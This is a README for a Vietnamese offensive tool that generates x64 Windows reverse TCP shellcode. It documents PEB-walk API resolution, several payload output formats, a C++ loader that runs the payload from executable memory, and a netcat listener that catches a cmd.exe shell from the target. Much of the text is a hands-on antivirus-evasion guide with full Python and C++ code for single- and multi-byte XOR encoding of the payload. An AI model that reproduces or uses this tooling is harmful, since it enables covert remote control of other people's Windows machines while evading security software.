# SnapeReverseTCP

```
  ███████╗███╗   ██╗ █████╗ ██████╗ ███████╗
  ██╔════╝████╗  ██║██╔══██╗██╔══██╗██╔════╝
  ███████╗██╔██╗ ██║███████║██████╔╝█████╗
  ╚════██║██║╚██╗██║██╔══██║██╔═══╝ ██╔══╝
  ███████║██║ ╚████║██║  ██║██║     ███████╗
  ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚══════╝
```

> Custom x64 Windows Reverse TCP Shellcode Generator  
> by **SeverusSnape**

---

## Features

- **Shellcode x64** — viết bằng NASM assembly, repo này với đem lại lợi ích không cần phụ thuộc vào msfvenom (Tránh bị AV detect signature của msfvenom)
- **PEB Walk** — tự định vị `kernel32.dll` qua `GS:[0x60]` (PEB → Ldr → InMemoryOrderModuleList)
- **Hash-based API resolution** — dùng ROR-13 hash để resolve `TerminateProcess`, `LoadLibraryA`, `CreateProcessA`, `WSAStartup`, `WSASocketA`, `connect`
- **Không có null byte** — shellcode tương thích với các payload injection context yêu cầu null-free
- **Nhiều output format**:
  | # | Format | Dùng cho |
  |---|--------|---------|
  | 1 | C Array | inject qua C/C++ |
  | 2 | Python bytes | scripting / exploit dev |
  | 3 | `\x` hex string | raw paste |
  | 4 | PowerShell byte array | PS-based dropper |
  | 5 | Raw hex | hexdump / tool khác |
  | 6 | **C++ Loader** | compile thành `.exe` ngay |
- **C++ Loader tích hợp** — `loader.cpp` template dùng `VirtualAlloc` + `memcpy` + function pointer, generate.py tự nhúng shellcode vào

---

## Usage

### Yêu cầu

| Thành phần | Phiên bản | Link |
|-----------|-----------|------|
| Python | ≥ 3.8 | https://python.org |
| NASM | ≥ 2.15 | https://www.nasm.us |

> **Windows:** NASM cần nằm trong `PATH`, hoặc đặt tại một trong các đường dẫn sau:
> - `%LOCALAPPDATA%\bin\NASM\nasm.exe`
> - `C:\Program Files\NASM\nasm.exe`
> - `C:\NASM\nasm.exe`

**Repo này bắt buộc phải có NASM, nếu chưa có thực hiện tải với**

```bash
winget install --id NASM.NASM -e
```

---

### Hướng dẫn cài đặt

**1. Clone repo**

```bash
git clone https://github.com/NgocHuongg/SnapeReverseTCP.git
cd SnapeReverseTCP
```

**2. Cài NASM (Windows)**

```powershell
# Tải installer tại https://www.nasm.us/pub/nasm/releasebuilds/
# Sau khi cài, thêm NASM vào PATH:
$env:PATH += ";C:\Program Files\NASM"
```

**3. Kiểm tra môi trường**

```bash
python --version   # >= 3.8
nasm --version     # >= 2.15
```

---

### Hướng dẫn sử dụng

**Chạy generator:**

```bash
python generate.py
```

Script sẽ hỏi lần lượt:

```
[*] Target IP   : <YOUR IP>
[*] Target Port : <YOUR PORT>

[?] Output format:
    1. C Array
    2. Python bytes
    3. \x hex
    4. PowerShell
    5. Raw hex
    6. C++ Loader
```

**Ví dụ output — C Array:**

```c
unsigned char shellcode[] = {
    0x48, 0x81, 0xec, 0x00, 0x10, 0x00, 0x00, 0x49, 0x89, 0xe7, 0x48, 0x31,
    ...
};
// size: 700 bytes
```

**Ví dụ output — C++ Loader (format 6):**

Chọn format `6` → script nhúng shellcode vào `loader.cpp` và xuất file `shellcode_192_168_1_100_4444.cpp`. Compile bằng MSVC hoặc MinGW:

```bash
# MSVC
cl /nologo /O2 shellcode_192_168_1_100_4444.cpp /Fe:loader.exe

# MinGW (g++)
g++ -o loader.exe shellcode_192_168_1_100_4444.cpp -lws2_32
```

**Bắt kết nối bằng netcat:**

```bash
nc -lvnp 4444
```

Chạy `loader.exe` trên máy target → nhận shell `cmd.exe`.

---

### Hướng dẫn custom bước evasion (XOR)

Hiện tại shellcode được nhúng dưới dạng plaintext. Để qua AV signature scan, bạn có thể thêm bước **XOR encode** khi xuất và **XOR decode** trong loader.

#### Bước 1 — Thêm hàm XOR encode vào `generate.py`

Thêm hàm sau vào cuối phần định nghĩa format (sau `fmt_raw_hex`):

```python
def xor_encode(data: bytes, key: int) -> bytes:
    return bytes(b ^ key for b in data)
```

Thêm một format mới vào dict `FORMATS`:

```python
FORMATS = {
    ...
    '7': ('C++ Loader (XOR)',  lambda sc: fmt_loader_xor(sc, 0xAB)),  # đổi key tùy ý
}
```

Thêm hàm `fmt_loader_xor`:

```python
def fmt_loader_xor(sc: bytes, key: int) -> str:
    encoded = xor_encode(sc, key)
    rows = []
    row = []
    for i, b in enumerate(encoded):
        row.append(f'0x{b:02x}')
        if len(row) == 12 or i == len(encoded) - 1:
            rows.append('    ' + ', '.join(row) + ',')
            row = []
    bytes_str = '\n'.join(rows)

    return f"""\
#include <Windows.h>
#include <cstdio>

unsigned char encoded[] = {{
{bytes_str}
}};

int main() {{
    const unsigned char key = 0x{key:02x};
    size_t len = sizeof(encoded);

    // XOR decode in-place
    for (size_t i = 0; i < len; i++)
        encoded[i] ^= key;

    void* mem = VirtualAlloc(nullptr, len,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return 1;

    memcpy(mem, encoded, len);
    reinterpret_cast<void(*)()>(mem)();

    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}}
"""
```

#### Bước 2 — Đổi XOR key

Thay giá trị `0xAB` trong `FORMATS['7']` thành bất kỳ byte nào (0x01–0xFE). Key khác nhau → signature khác nhau:

```python
'7': ('C++ Loader (XOR)',  lambda sc: fmt_loader_xor(sc, 0x37)),
```

Tránh dùng key `0x00` (XOR với 0 = không thay đổi).

#### Bước 3 — Multi-byte key (nâng cao)

Để mạnh hơn, dùng key nhiều byte:

```python
def xor_encode_multi(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
```

Ví dụ key 4 byte: `key = b"\xDE\xAD\xBE\xEF"`.

Trong loader C++:

```cpp
unsigned char key[] = { 0xDE, 0xAD, 0xBE, 0xEF };
for (size_t i = 0; i < len; i++)
    encoded[i] ^= key[i % sizeof(key)];
```

---

## Cấu trúc repo

```
SnapeReverseTCP/
├── shellcode.asm   # x64 NASM source — reverse TCP shell
├── generate.py     # Generator script — compile + format output
└── loader.cpp      # C++ loader template (được generate.py điền shellcode vào)
```

---
